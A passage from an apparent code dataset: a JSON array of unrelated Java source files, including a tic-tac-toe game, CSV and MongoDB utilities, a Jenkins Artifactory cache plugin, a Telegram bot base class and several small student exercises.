        return;\n\n            }\n            if (board[0][2].getText() == board[1][1].getText() &&\n                    board[1][1].getText() == board[2][0].getText() &&\n                    board[0][2].getText() != \"\") {\n                    setWinner(board[0][2]);\n                    setWinner(board[1][1]);\n                    setWinner(board[2][0]);\n\n                gameOver = true;\n                return;\n            }\n\n            if (turns == 9){\n                for (int r = 0; r < 3; r++){\n                    for (c = 0; c < 3; c++){\n                        setTie(board[r][c]);\n                    }\n                }\n                gameOver = true;\n            }\n        }\n\n        }\n\n    private void setTie(JButton tile) {\n        tile.setBackground(Color.gray);\n        tile.setForeground(Color.orange);\n        textLabel.setText(\"Tie !\");\n    }\n\n    private void setWinner(JButton tile) {\n        tile.setForeground(Color.green);\n        tile.setBackground(Color.gray);\n        textLabel.setText(currentPlayer + \" is the winnwr !\");\n    }\n\n\n    public static void main(String[] args) {\n        new App();\n    }\n}\n\n\n",
    "package service;\n\nimport entities.Inventory;\nimport entities.Product;\nimport java.io.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.text.ParseException;\nimport java.text.SimpleDateFormat;\nimport java.util.List;\nimport java.util.stream.Stream;\n\npublic class CSVHandler {\n  private static final SimpleDateFormat DATE_FORMAT = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n\n  public static void writeCSV(List<Product> products, String fileName) {\n    try (PrintWriter writer = new PrintWriter(new File(fileName))) {\n      writer.println(\"Name,Quantity,Price,Category,CreationDate,UpdateDate\");\n\n      products.stream()\n          .map(\n              product ->\n                  String.join(\n                      \",\",\n                      product.getName(),\n                      String.valueOf(product.getQuantity()),\n                      String.valueOf(product.getPrice()),\n                      product.getCategory(),\n                      DATE_FORMAT.format(product.getCreationDate()),\n                      DATE_FORMAT.format(product.getUpdateDate())))\n          .forEach(writer::println);\n\n    } catch (FileNotFoundException e) {\n      System.out.println(e.getMessage());\n    }\n  }\n\n  public static Inventory readCSV(String fileName) {\n    Inventory inventory = new Inventory();\n\n    try (Stream<String> lines = Files.lines(Paths.get(fileName))) {\n      lines\n          .skip(1)\n          .map(line -> line.split(\",\"))\n          .map(\n              product -> {\n                try {\n                  return new Product(\n                      product[0],\n                      Integer.parseInt(product[1]),\n                      Double.parseDouble(product[2]),\n                      product[3],\n                      DATE_FORMAT.parse(product[4]),\n                      DATE_FORMAT.parse(product[5]));\n                } catch (ParseException e) {\n                  throw new RuntimeException(e);\n                }\n              })\n          .forEach(inventory::addProduct);\n\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n\n    return inventory;\n  }\n}\n",
    "package com.iboot.iot.milo.utils;\n\nimport com.iboot.iot.milo.configuration.MiloProperties;\nimport com.iboot.iot.milo.core.exception.MiloPropertiesEndPointNullPointerException;\nimport com.iboot.iot.milo.core.exception.MiloPropertiesNullPointerException;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.util.StringUtils;\n\nimport java.util.Iterator;\nimport java.util.Map;\n\n/**\n * @author tangsc\n * @version 0.0.1\n * @desc\n * @since 2020/4/13\n */\n@Slf4j\npublic class MiloPropertiesUtil {\n    private MiloPropertiesUtil() {\n    }\n\n    public static void verifyProperties(MiloProperties properties) {\n        if (properties.getConfig().isEmpty()) {\n            throw new MiloPropertiesNullPointerException(\"the Milo Properties is Null or Empty\");\n        }\n        properties.getConfig().forEach((clientName, config) -> {\n            if (!StringUtils.hasText(config.getEndpoint())) {\n                throw new MiloPropertiesEndPointNullPointerException( \"the Milo Property's Endpoint is Empty: \" + clientName);\n            }\n        });\n    }\n\n    public static MiloProperties.Config getConfig(MiloProperties properties, String clientName) {\n        Map<String, MiloProperties.Config> config = properties.getConfig();\n        if (StringUtils.hasText(clientName)) {\n            return config.get(clientName);\n        }\n\n        Iterator<MiloProperties.Config> iterator = config.values().iterator();\n        if (iterator.hasNext()) {\n            return iterator.next();\n        }\n\n        throw new IllegalStateException(\"Config map is empty\");\n    }\n\n    /**\n     * get the default config of OPC-UA Server list\n     * @param properties\n     * @return\n     */\n    public static MiloProperties.Config getConfig(MiloProperties properties) {\n        return getConfig(properties, null);\n    }\n}\n",
    "// Classe ContaInvestimento\npublic class ContaInvestimento extends Conta{\n    private double taxa;\n    private int prazo;\n\n    public ContaInvestimento() {\n        super();\n    }\n\n    public ContaInvestimento(int numero, double saldo, double taxa, int prazo) {\n        super(numero, saldo);\n        this.taxa = taxa;\n        this.setPrazo(prazo);\n    }\n\n    public boolean sacar(double valor) {\n        if(getSaldo() >= valor) {\n            double novoSaldo = getSaldo() - (valor * this.taxa);\n            setSaldo(novoSaldo);\n            return true;\n        } else {\n            return false;\n        }\n    }\n    public boolean depositar(double valor) {\n        if(valor >= 0) {\n            setSaldo(getSaldo() + (valor * this.taxa));\n            return true;\n        } else {\n            return false;\n        }\n    }\n    public void addRendimento(double taxa) {\n        setSaldo(getSaldo() + (1 * taxa));\n    }\n\n    public int getPrazo() {\n        return prazo;\n    }\n\n    public void setPrazo(int prazo) {\n        this.prazo = prazo;\n    }\n\n}",
    "package io.jenkins.plugins.jobcacher.artifactory;\n\nimport hudson.AbortException;\nimport hudson.FilePath;\nimport hudson.model.Job;\nimport hudson.remoting.VirtualChannel;\nimport hudson.util.IOUtils;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport jenkins.MasterToSlaveFileCallable;\nimport jenkins.plugins.itemstorage.ObjectPath;\nimport org.kohsuke.stapler.HttpResponse;\nimport org.kohsuke.stapler.StaplerRequest;\nimport org.kohsuke.stapler.StaplerResponse;\n\npublic class ArtifactoryItemPath extends ObjectPath {\n\n    private final ArtifactoryClient client;\n    private final String fullName;\n    private final String path;\n\n    public ArtifactoryItemPath(final ArtifactoryClient client, final String fullName, final String path) {\n        this.client = client;\n        this.fullName = fullName;\n        this.path = path;\n    }\n\n    public ArtifactoryClient getClient() {\n        return client;\n    }\n\n    public String getFullName() {\n        return fullName;\n    }\n\n    public String getPath() {\n        return path;\n    }\n\n    @Override\n    public ArtifactoryItemPath child(String childPath) throws IOException, InterruptedException {\n        return new ArtifactoryItemPath(client, fullName, String.format(\"%s/%s\", path, childPath));\n    }\n\n    @Override\n    public void copyTo(FilePath target) throws IOException, InterruptedException {\n        target.act(new DownloadFromArtifactoryStorage(client.getConfig(), String.format(\"%s/%s\", fullName, path)));\n    }\n\n    @Override\n    public void copyFrom(FilePath source) throws IOException, InterruptedException {\n        source.act(new UploadToArtifactoryStorage(client.getConfig(), String.format(\"%s/%s\", fullName, path)));\n    }\n\n    @Override\n    public boolean exists() throws IOException, InterruptedException {\n        return client.isFile(String.format(\"%s/%s\", fullName, path));\n    }\n\n    @Override\n    public void deleteRecursive() throws IOException, InterruptedException {\n        client.deleteArtifact(String.format(\"%s/%s\", fullName, path));\n    }\n\n    @Override\n    public HttpResponse browse(StaplerRequest request, StaplerResponse response, Job<?, ?> job, String name)\n            throws IOException {\n        return null;\n    }\n\n    /**\n     * Master to slave callable that upload a cache to Artifactory storage.\n     */\n    private static class UploadToArtifactoryStorage extends MasterToSlaveFileCallable<Void> {\n\n        private final ArtifactoryClient.ArtifactoryConfig config;\n        private final String path;\n\n        public UploadToArtifactoryStorage(ArtifactoryClient.ArtifactoryConfig config, String path) {\n            this.config = config;\n            this.path = path;\n        }\n\n        @Override\n        public Void invoke(File f, VirtualChannel channel) throws IOException, InterruptedException {\n            try (ArtifactoryClient client = new ArtifactoryClient(this.config)) {\n                client.uploadArtifact(f.toPath(), path);\n            } catch (Exception e) {\n                throw new AbortException(\"Unable to upload cache to Artifactory. Details: \" + e.getMessage());\n            }\n            return null;\n        }\n    }\n\n    /**\n     * Master to slave callable that upload a cache to Artifactory storage.\n     */\n    private static class DownloadFromArtifactoryStorage extends MasterToSlaveFileCallable<Void> {\n\n        private final ArtifactoryClient.ArtifactoryConfig config;\n        private final String path;\n\n        public DownloadFromArtifactoryStorage(ArtifactoryClient.ArtifactoryConfig config, String path) {\n            this.config = config;\n            this.path = path;\n        }\n\n        @Override\n        public Void invoke(File f, VirtualChannel channel) throws IOException, InterruptedException {\n            try (ArtifactoryClient client = new ArtifactoryClient(this.config)) {\n                try (InputStream is = client.downloadArtifact(path)) {\n                    IOUtils.copy(is, f);\n                }\n            } catch (Exception e) {\n                throw new AbortException(\"Unable to upload cache to Artifactory. Details: \" + e.getMessage());\n            }\n            return null;\n        }\n    }\n}\n",
    "package com.github.beafland.fallofbastille.character;\n\nimport com.github.beafland.fallofbastille.Game;\nimport javafx.animation.KeyFrame;\nimport javafx.animation.Timeline;\nimport javafx.scene.input.KeyCode;\nimport javafx.util.Duration;\n\nimport java.util.Set;\n\npublic class BotController {\n    private static final int SPEED = 4;\n    private static final double LERP_SPEED = 0.1;\n    private final Bot bot;\n    private final Timeline attackTimeline;\n    private double targetX; // \u76ee\u6807X\u4f4d\u7f6e\n    private double targetY; // \u76ee\u6807Y\u4f4d\u7f6e\n    private boolean isAttack = false;\n\n    public BotController(Bot bot) {\n        this.bot = bot;\n        this.targetX = bot.getX();\n        this.targetY = bot.getY();\n\n        attackTimeline = new Timeline(new KeyFrame(Duration.seconds(1), e -> isAttack = false));\n        attackTimeline.setCycleCount(Timeline.INDEFINITE);\n    }\n\n    public void update() {\n        bot.setX(targetX + (targetX - bot.getX()) * LERP_SPEED);\n        bot.setY(targetY + (targetY - bot.getY()) * LERP_SPEED);\n    }\n\n    public void fire() {\n        if (!isAttack) {\n            isAttack = true;\n            System.out.println(\"Fire!\");\n            attackTimeline.play();\n        }\n    }\n\n    public void moveLeft() {\n        targetX -= SPEED;\n        if (targetX < 0) {\n            targetX = 0;\n        }\n    }\n\n    public void moveRight() {\n        targetX += SPEED;\n        if (targetX + Player.getWIDTH() > Game.WIDTH) {\n            targetX = Game.WIDTH - Player.getWIDTH();\n        }\n    }\n\n    public void moveDown() {\n        targetY += SPEED;\n        if (targetY + Player.getHEIGHT() > Game.HEIGHT) {\n            targetY = Game.HEIGHT - Player.getHEIGHT();\n        }\n    }\n\n    public void moveUp() {\n        targetY -= SPEED;\n        if (targetY < 0) {\n            targetY = 0;\n        }\n    }\n}\n",
    "package com.java8;\n\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.function.BiConsumer;\n\npublic class PropUtilsTest {\n\n    private static BiConsumer<Object, Object> biConsumer = (k,v) -> System.out.println(k+\":\"+v);\n\n    public static void main(String[] args) throws IOException {\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"D:\\\\Selenium Projects\\\\java8Features\\\\src\\\\test\\\\resources\\\\config\\\\config.properties\"));\n        for(Map.Entry<Object,Object> entry: properties.entrySet())\n        {\n            System.out.println(entry.getKey()+\" \"+ entry.getValue());\n        }\n\n//        properties.forEach((k,v)-> System.out.println(k+\":\"+v));\nproperties.forEach(biConsumer);\n        properties.entrySet().forEach(e-> System.out.println(e.getKey()+\":\"+e.getValue()));\n\n        Map<Integer,String> map = new HashMap<>();\n        map.put(1,\"Harry\");\n        map.put(2,\"Potter\");\n        map.put(3,\"Hermione\");\n        map.put(4,\"Granger\");\n\n        for(Map.Entry<Integer,String> temp: map.entrySet()){\n            System.out.println(temp.getKey()+\":\"+temp.getValue());\n        }\n\n        map.forEach((k,v) -> System.out.println(k+\":\"+v));\n        System.out.println(\"keyset\");\n        map.keySet().forEach(k-> System.out.println(k+\":\"+map.get(k)));\n}\n}\n",
    "package bmi;\n\n\npublic class BodyMassIndex {\n    private double height;\n    private double weight;\n\n    public BodyMassIndex (){\n\n    }\n\n    private double checkHeight(double height){\n        if(height > 3)\n            return height /= 100;\n        else\n            return height;\n    }\n\n    public double calculateBmi(double height, double weight){\n        height = checkHeight(height);\n        return weight / (height * height);\n    }\n\n    public String printWeightRange(double bodyMassIndex){\n        if(bodyMassIndex >= 30)\n            return \"Obese\";\n        else if(bodyMassIndex >= 25)\n            return \"Overweight\";\n        else if(bodyMassIndex >= 18.5)\n            return \"Normal\";\n        else\n            return \"Underweight\";\n    }\n\n    public double getHeight() {\n        return height;\n    }\n\n    public void setHeight(double height) {\n        this.height = height;\n    }\n\n    public double getWeight() {\n        return weight;\n    }\n\n    public void setWeight(double weight) {\n        this.weight = weight;\n    }\n}\n",
    "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        UserManagement system = new UserManagement();\n\n        // Adaugam utilizatori\n        system.addUser(new User(1, \"Samantha\", \"Wolf\", \"samy@mail.com\", 30));\n        system.addUser(new User(2, \"Andrew\", \"Grey\", \"andrewg@mail.com\", 25));\n        system.addUser(new User(3,\"Marina\", \"Price\", \"marina.p@mail.com\", 24));\n\n        // Afisam toti utilizatorii\n        System.out.println(\"All users:\");\n        system.displayAllUsers();\n        System.out.println();\n\n        // Afisam un utilizator dupa id\n        System.out.println(\"User with id 1:\");\n        User user = system.getUserById(1);\n        if (user != null) {\n            System.out.println(user);\n        } else {\n            System.out.println(\"User not found.\");\n        }\n        System.out.println();\n\n        // \u0218tergem un utilizator\n        System.out.println(\"Deleting user with id 2:\");\n        system.deleteUser(2);\n        system.displayAllUsers();\n        System.out.println();\n\n        // Modificam numele unui utilizator\n        System.out.println(\"Updating first name of user with id 1:\");\n        system.updateUserFirstName(1, \"Claire\");\n        system.displayAllUsers();\n        System.out.println();\n\n        // Modificam emailul unui utilizator\n        System.out.println(\"Updating email of user with id 1:\");\n        system.updateUserEmail(1, \"claire.wolf@mail.com\");\n        system.displayAllUsers();\n\n        Scanner scanner = new Scanner(System.in);\n\n        boolean continueExecution = true;\n\n        while (continueExecution) {\n            System.out.println(\"Choose an operation:\");\n            System.out.println(\"1. Add a user\");\n            System.out.println(\"2. Delete a user\");\n            System.out.println(\"3. Display all users\");\n            System.out.println(\"4. Exit\");\n\n            int choice = scanner.nextInt();\n            scanner.nextLine();\n\n            switch (choice) {\n                case 1:\n                    System.out.println(\"Enter user details:\");\n                    System.out.print(\"ID: \");\n                    int id = scanner.nextInt();\n                    scanner.nextLine(); \n                    System.out.print(\"First Name: \");\n                    String firstName = scanner.nextLine();\n                    System.out.print(\"Last Name: \");\n                    String lastName = scanner.nextLine();\n                    System.out.print(\"Email: \");\n                    String email = scanner.nextLine();\n                    System.out.print(\"Age: \");\n                    int age = scanner.nextInt();\n                    scanner.nextLine();\n                    system.addUser(new User(id, firstName, lastName, email, age));\n                    System.out.println(\"User added successfully.\");\n                    break;\n                case 2:\n                    System.out.print(\"Enter the ID of the user to delete: \");\n                    int deleteId = scanner.nextInt();\n                    scanner.nextLine();\n                    system.deleteUser(deleteId);\n                    System.out.println(\"User deleted successfully.\");\n                    break;\n                case 3:\n                    System.out.println(\"All users:\");\n                    system.displayAllUsers();\n                    break;\n                case 4:\n                    continueExecution = false;\n                    break;\n                default:\n                    System.out.println(\"Invalid choice. Please enter a number between 1 and 4.\");\n                    break;\n            }\n        }\n\n        System.out.println(\"Exiting the program.\");\n        scanner.close();\n    }\n}\n",
    "\r\nimport java.util.*;\r\nimport java.lang.Math;\r\n\r\npublic class Squares {\r\n\tpublic static void main(String args[]) {\r\n\t\ttry (Scanner sc = new Scanner(System.in)) {\r\n\t\t\tSystem.out.println(\"How many numbers do you want to store?\");\r\n\t\t\tdouble d[] = new double[sc.nextInt()];\r\n\t\t\tSystem.out.println(\"Enter the numbers\");\r\n\t\t\tfor (int i = 0; i < d.length; i++)\r\n\t\t\t\td[i] = sc.nextDouble();\r\n\t\t\tfor (double d1 : d)\r\n\t\t\t\tSystem.out.print(d1 + \" \");\r\n\t\t\tSystem.out.println();\r\n\t\t\tboolean run = true;\r\n\t\t\tdo {\r\n\t\t\t\tSystem.out.println(\"\\n\" + \"Choose any option:\" + \"\\n\" + \"1 Double nums\" + \"\\n\" + \"2 Square nums\" + \"\\n\"\r\n\t\t\t\t\t\t+ \"3 Square root nums\" + \"\\n\" + \"4 Exit\" + \"\\n\");\r\n\t\t\t\tswitch (sc.nextInt()) {\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\tfor (double d1 : d)\r\n\t\t\t\t\t\tSystem.out.print(d1 * 2 + \" \");\r\n\t\t\t\t\tSystem.out.println();\r\n\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\tfor (double d1 : d)\r\n\t\t\t\t\t\tSystem.out.print(d1 * d1 + \" \");\r\n\t\t\t\t\tSystem.out.println();\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\tfor (double d1 : d)\r\n\t\t\t\t\t\tSystem.out.print(Math.sqrt(d1) + \" \");\r\n\t\t\t\t\tSystem.out.println();\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tcase 4:\r\n\t\t\t\t\tSystem.out.println(\"bye\");\r\n\t\t\t\t\trun = false;\r\n\r\n\t\t\t\t}\r\n\t\t\t} while (run);\r\n\t\t}\r\n\t}\r\n}",
    "package net.fuchsia.client.registry;\n\nimport net.minecraft.client.render.model.json.ModelTransformationMode;\nimport net.minecraft.item.Item;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class FadenItemModelRegistry {\n    private Map<Item, ModelData> models = new HashMap<>();\n\n    public void addModel(Item item) {\n        models.put(item, new ModelData());\n    }\n\n    public void addModel(Item item, ModelData modelData) {\n        models.put(item, modelData);\n    }\n\n    public void addModel(Item item, String path) {\n        models.put(item, new ModelData(path));\n    }\n\n    public ModelData getModel(Item item) {\n        return models.get(item);\n    }\n\n    public boolean hasModel(Item item) {\n        return models.containsKey(item);\n    }\n\n    public Map<Item, ModelData> getModels() {\n        return models;\n    }\n\n    public static class ModelData {\n        private String variant = \"inventory\";\n        /* If you want to set a custom model path, normalily its assets/<item_mod_id>/models/item/model/<item_name>.json */\n        private String path = \"\";\n\n        /* The Mode to override its not at */\n        private ModelTransformationMode mode = ModelTransformationMode.GUI;\n        public ModelData(String variant, String path, ModelTransformationMode mode) {\n            this.variant = variant;\n            this.path = path;\n            this.mode = mode;\n        }\n\n        public ModelData(String path) {\n            this.path = path;\n        }\n\n        public ModelData() {}\n\n        public String getPath() {\n            return path;\n        }\n\n        public String getVariant() {\n            return variant;\n        }\n\n        public ModelTransformationMode getMode() {\n            return mode;\n        }\n    }\n}\n",
    "package com.rcross.filewatcher;\n\n// Copyright 2000-2024 JetBrains s.r.o. and contributors. Use of this source code is governed by the Apache 2.0 license.\n//package com.intellij.openapi.vfs.impl.local;\n\nimport com.intellij.execution.process.OSProcessHandler;\nimport com.intellij.execution.process.ProcessOutputTypes;\nimport com.intellij.ide.IdeCoreBundle;\nimport com.intellij.ide.ui.IdeUiService;\nimport com.intellij.notification.NotificationListener;\nimport com.intellij.openapi.application.Application;\nimport com.intellij.openapi.application.ApplicationManager;\nimport com.intellij.openapi.application.PathManager;\nimport com.intellij.openapi.diagnostic.Logger;\nimport com.intellij.openapi.fileTypes.FileTypeManager;\nimport com.intellij.openapi.fileTypes.impl.FileTypeManagerImpl;\nimport com.intellij.openapi.util.*;\nimport com.intellij.openapi.util.io.OSAgnosticPathUtil;\nimport com.intellij.openapi.util.text.StringUtil;\nimport com.intellij.openapi.vfs.CharsetToolkit;\nimport com.intellij.openapi.vfs.local.FileWatcherNotificationSink;\nimport com.intellij.openapi.vfs.local.PluggableFileWatcher;\nimport com.intellij.openapi.vfs.newvfs.ManagingFS;\nimport com.intellij.util.SmartList;\nimport com.intellij.util.TimeoutUtil;\nimport com.intellij.util.io.BaseDataReader;\nimport com.intellij.util.io.BaseOutputReader;\nimport com.intellij.util.system.CpuArch;\nimport org.apache.tools.ant.Project;\nimport org.jetbrains.annotations.NotNull;\nimport org.jetbrains.annotations.Nullable;\nimport org.jetbrains.annotations.TestOnly;\nimport org.jetbrains.jps.model.JpsModel;\nimport org.jetbrains.jps.model.impl.JpsModelImpl;\nimport org.jetbrains.jps.service.JpsServiceManager;\nimport com.intellij.openapi.roots.ui.configuration.ProjectSettingsService;\nimport com.intellij.openapi.project.ProjectManager;\n\nimport java.io.BufferedWriter;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.nio.charset.Charset;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.text.Normalizer;\nimport java.util.*;\nimport java.util.concurrent.CopyOnWriteArrayList;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class NativeFileWatcherImpl extends PluggableFileWatcher {\n    private static final Logger LOG = Logger.getInstance(NativeFileWatcherImpl.class);\n\n    private static final String PROPERTY_WATCHER_DISABLED = \"com.rcross.filewatcher.disabled\";\n    private static final String PROPERTY_WATCHER_EXECUTABLE_PATH = \"com.rcross.filewatcher.executable.path\";\n    private static final String SIGNORE_COMMAND = \"SIGNORE\";\n    private static final String ROOTS_COMMAND = \"ROOTS\";\n    private static final String EXIT_COMMAND = \"EXIT\";\n    private static final int MAX_PROCESS_LAUNCH_ATTEMPT_COUNT = 10;\n    private static final int EXIT_TIMEOUT_MS = 500;\n\n    private FileWatcherNotificationSink myNotificationSink;\n    private Path myExecutable;\n\n    private volatile MyProcessHandler myProcessHandler;\n    private final AtomicInteger myStartAttemptCount = new AtomicInteger(0);\n    private volatile boolean myIsShuttingDown;\n    private final AtomicInteger mySettingRoots = new AtomicInteger(0);\n    private volatile List<String> myRecursiveWatchRoots = Collections.emptyList();\n    private volatile List<String> myFlatWatchRoots = Collections.emptyList();\n    private volatile List<String> myIgnoredRoots = Collections.emptyList();\n    private final String[] myLastChangedPaths = new String[2];\n    private int myLastChangedPathIndex;\n\n    @Override\n    public void initialize(@NotNull ManagingFS managingFS, @NotNull FileWatcherNotificationSink notificationSink) {\n        myNotificationSink = notificationSink;\n\n        boolean disabled = isDisabled();\n        myExecutable = getExecutable();\n\n        if (disabled) {\n            LOG.info(\"Native file watcher is disabled\");\n        }\n        else if (myExecutable == null) {\n            if (SystemInfo.isWindows || SystemInfo.isMac || SystemInfo.isLinux && (CpuArch.isIntel64() || CpuArch.isArm64())) {\n                notifyOnFailure(IdeCoreBundle.message(\"watcher.exe.not.found\"), null);\n            }\n            else if (SystemInfo.isLinux) {\n                notifyOnFailure(IdeCoreBundle.message(\"watcher.exe.compile\"), NotificationListener.URL_OPENING_LISTENER);\n            }\n            else {\n                notifyOnFailure(IdeCoreBundle.message(\"watcher.exe.not.exists\"), null);\n            }\n        }\n        else if (!Files.isExecutable(myExecutable)) {\n            String message = IdeCoreBundle.message(\"watcher.exe.not.exe\", myExecutable);\n            notifyOnFailure(message, (notification, event) -> IdeUiService.getInstance().revealFile(myExecutable));\n        }\n        else {\n            try {\n                startupProcess(false);\n                LOG.info(\"Native file watcher is operational.\");\n\n//                ProjectManager p = ProjectManager.getInstance();\n//                ProjectSettingsSe",
    "package org.example;\n\nimport com.mongodb.client.MongoClients;\nimport com.mongodb.client.MongoClient;\nimport com.mongodb.client.MongoDatabase;\nimport com.mongodb.client.MongoCollection;\nimport com.mongodb.client.model.Filters;\nimport com.mongodb.client.model.Updates;\nimport org.bson.Document;\n\npublic class MongoDBCrudOperations {\n    public static void main(String[] args) {\n        // Connexion \u00e0 MongoDB\n        try (MongoClient mongoClient = MongoClients.create(\"mongodb://localhost:27017\")) {\n            MongoDatabase database = mongoClient.getDatabase(\"myDatabase\");\n            MongoCollection<Document> collection = database.getCollection(\"users\");\n\n            // Insertions donn\u00e9es\n            for (int i = 1; i <= 5; i++) {\n                collection.insertOne(new Document(\"name\", \"User \" + i)\n                        .append(\"age\", 25 + i)\n                        .append(\"email\", \"user\" + i + \"@example.com\")\n                        .append(\"createdAt\", new java.util.Date()));\n            }\n            System.out.println(\"Insertion des donn\u00e9es termin\u00e9e.\");\n\n            // Lis et affiche tous les utilisateurs de plus de 30 ans\n            for (Document user : collection.find(Filters.gt(\"age\", 30))) {\n                System.out.println(user.toJson());\n            }\n\n            // Mets \u00e0 jour l'\u00e2ge de tous les utilisateurs en ajoutant 5 ans\n            collection.updateMany(new Document(), Updates.inc(\"age\", 5));\n            System.out.println(\"Mise \u00e0 jour de l'\u00e2ge des utilisateurs termin\u00e9e.\");\n\n            // Supprime un utilisateur\n            collection.deleteOne(Filters.eq(\"name\", \"User 3\"));\n            System.out.println(\"Suppression de l'utilisateur sp\u00e9cifique termin\u00e9e.\");\n        }\n    }\n}\n",
    "package es.codegym.telegrambot;\n\nimport org.telegram.telegrambots.bots.TelegramLongPollingBot;\nimport org.telegram.telegrambots.meta.api.methods.send.SendMessage;\nimport org.telegram.telegrambots.meta.api.methods.send.SendPhoto;\nimport org.telegram.telegrambots.meta.api.objects.InputFile;\nimport org.telegram.telegrambots.meta.api.objects.Update;\nimport org.telegram.telegrambots.meta.api.objects.replykeyboard.InlineKeyboardMarkup;\nimport org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardButton;\n\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class MultiSessionTelegramBot extends TelegramLongPollingBot {\n    private String name;\n    private String token;\n\n    private ThreadLocal<Update> updateEvent = new ThreadLocal<>();\n    private HashMap<Long, Integer> gloryStorage = new HashMap<>();\n\n    public MultiSessionTelegramBot(String name, String token) {\n        this.name = name;\n        this.token = token;\n    }\n\n    @Override\n    public String getBotUsername() {\n        return name;\n    }\n\n    @Override\n    public String getBotToken() {\n        return token;\n    }\n\n    @Override\n    public final void onUpdateReceived(Update updateEvent) {\n        this.updateEvent.set(updateEvent);\n        onUpdateEventReceived(this.updateEvent.get());\n    }\n\n    public void onUpdateEventReceived(Update updateEvent) {\n        //do nothing\n    }\n\n    public Long getCurrentChatId() {\n        if (updateEvent.get().hasMessage()) {\n            return updateEvent.get().getMessage().getFrom().getId();\n        }\n\n        if (updateEvent.get().hasCallbackQuery()) {\n            return updateEvent.get().getCallbackQuery().getFrom().getId();\n        }\n\n        return null;\n    }\n\n    public String getMessageText() {\n        return updateEvent.get().hasMessage() ? updateEvent.get().getMessage().getText() : \"\";\n    }\n\n    public String getCallbackQueryButtonKey() {\n        return updateEvent.get().hasCallbackQuery() ? updateEvent.get().getCallbackQuery().getData() : \"\";\n    }\n\n    public void sendTextMessageAsync(String text) {\n        SendMessage message = createMessage(text);\n        sendApiMethodAsync(message);\n    }\n\n    public void sendTextMessageAsync(String text,  Map<String, String> buttons) {\n        SendMessage message = createMessage(text, buttons);\n        sendApiMethodAsync(message);\n    }\n\n    public void sendPhotoMessageAsync(String photoKey) {\n        SendPhoto photo = createPhotoMessage(photoKey);\n        executeAsync(photo);\n    }\n\n\n    public SendMessage createMessage( String text) {\n        SendMessage message = new SendMessage();\n        message.setText(new String(text.getBytes(), StandardCharsets.UTF_8));\n        message.setParseMode(\"markdown\");\n        Long chatId = getCurrentChatId();\n        message.setChatId(chatId);\n        return message;\n    }\n\n    public SendMessage createMessage( String text, Map<String, String> buttons) {\n        SendMessage message = createMessage(text);\n        if (buttons != null && !buttons.isEmpty())\n            attachButtons(message, buttons);\n        return message;\n    }\n\n    private void attachButtons(SendMessage message, Map<String, String> buttons) {\n        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();\n        List<List<InlineKeyboardButton>> keyboard = new ArrayList<>();\n\n        for (String buttonName : buttons.keySet()) {\n            String buttonValue = buttons.get(buttonName);\n\n            InlineKeyboardButton button = new InlineKeyboardButton();\n            button.setText(new String(buttonName.getBytes(), StandardCharsets.UTF_8));\n            button.setCallbackData(buttonValue);\n\n            keyboard.add(List.of(button));\n        }\n\n        markup.setKeyboard(keyboard);\n        message.setReplyMarkup(markup);\n    }\n\n    public SendPhoto createPhotoMessage(String name) {\n        try {\n            SendPhoto photo = new SendPhoto();\n            InputFile inputFile = new InputFile();\n            var is = ClassLoader.getSystemResourceAsStream(\"images/\" + name + \".jpg\");\n            inputFile.setMedia(is, name);\n\n            photo.setPhoto(inputFile);\n            Long chatId = getCurrentChatId();\n            photo.setChatId(chatId);\n            return photo;\n        } catch (Exception e) {\n            throw new RuntimeException(\"Can't create photo message!\");\n        }\n    }\n\n\n    public void setUserGlory(int glories) {\n        gloryStorage.put( getCurrentChatId(), glories);\n    }\n    public int getUserGlory() {\n        return gloryStorage.getOrDefault( getCurrentChatId(), 0);\n    }\n\n    public void addUserGlory(int glories) {\n        gloryStorage.put(getCurrentChatId(), getUserGlory() + glories);\n    }\n}\n",
    "import java.util.Scanner;\n\npublic class App {\n    public static void main(String[] args) throws Exception {\n        boolean keepRunning = true;\n        Game currentGame = new Game();\n        Game otherGame = Consts.Player1IsBot ? new Game() : currentGame.getGame();\n        Scanner scanner = new Scanner(System.in);\n        String input = \"\";\n        if (Consts.Bot1v1) {\n            Game.PrintBoardDisplay(currentGame, otherGame);\n        } else {\n            Game.PrintBoardDisplay(currentGame);\n        }\n\n        while (keepRunning) {\n            input = Consts.Player1IsBot ? Bot.compute2(currentGame, 5, 100) : scanner.next();\n            if (input.charAt(0) == '/') {\n                switch (input.substring(1)) {\n                    case \"bot\":\n                        long t = System.currentTimeMillis();\n                        long t2 = System.currentTimeMillis();\n                        for (int i=0; i<1000; i++) {\n                            t = t2;\n                            Game other2Game = currentGame.getGame();\n                            String moveString = Bot.compute2(currentGame, 5, 150);\n                            t2 = System.currentTimeMillis();\n                            currentGame.doMovement(moveString, 1);\n                            other2Game.doMovement(moveString);\n                            Game.PrintBoardDisplay(currentGame, other2Game);\n                            System.out.println(\"ATTACK: \" + currentGame.attackSent + \", PLACED: \" + currentGame.piecesPlaced + \", TIME: \" + (t2-t));\n                            if (t%6==0) currentGame.garbage.addGarbageToQueue(4);\n                        }\n                        break;\n                    case \"movetree\":\n                        long t3 = System.currentTimeMillis();\n                        for (int 